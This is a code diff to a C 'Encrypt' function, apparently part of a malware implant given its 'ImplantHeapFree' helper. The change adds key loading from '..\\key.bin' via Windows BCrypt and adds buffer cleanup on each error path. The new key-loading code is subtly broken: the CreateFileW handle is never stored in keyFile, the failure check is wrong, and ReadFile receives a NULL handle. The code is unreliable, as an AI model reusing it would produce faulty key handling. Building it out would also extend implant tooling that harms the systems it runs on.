@@ -199,9 +199,11 @@ BOOL Encrypt(PBYTE* msg, DWORD msgLength) {
 	DWORD cbDataRet = 0;
 	PBYTE temp = *msg;
 	ULONG sizeRequired = 0;
+	HANDLE keyFile = NULL;
 
 	if (status != STATUS_SUCCESS)
 	{
+		ImplantHeapFree(buff);
 		return FALSE;
 	}
 
@@ -213,12 +215,26 @@ BOOL Encrypt(PBYTE* msg, DWORD msgLength) {
 		0);
 	if (status != STATUS_SUCCESS)
 	{
+		ImplantHeapFree(buff);
+		return FALSE;
+	}
+
+	if (!CreateFileW(L"..\\key.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL))
+	{
+		ImplantHeapFree(buff);
+		return FALSE;
+	}
+
+	if (!ReadFile(keyFile, buff, KEY_BUFF_SIZE, NULL, NULL))
+	{
+		ImplantHeapFree(buff);
 		return FALSE;
 	}
 
 	status = BCryptImportKey(hAlg, NULL, BCRYPT_KEY_DATA_BLOB, hKey, NULL, 0, buff, KEY_BUFF_SIZE, 0);
 	if (status != STATUS_SUCCESS)
 	{
+		ImplantHeapFree(buff);
 		return FALSE;
 	}
 
@@ -227,6 +243,7 @@ BOOL Encrypt(PBYTE* msg, DWORD msgLength) {
 	status = BCryptEncrypt(hKey, temp, msgLength, NULL, NULL, 0, *msg, sizeRequired, &sizeRequired, BCRYPT_BLOCK_PADDING);
 	if (status != STATUS_SUCCESS)
 	{
+		ImplantHeapFree(buff);
 		return FALSE;
 	}
 	ImplantHeapFree(temp);
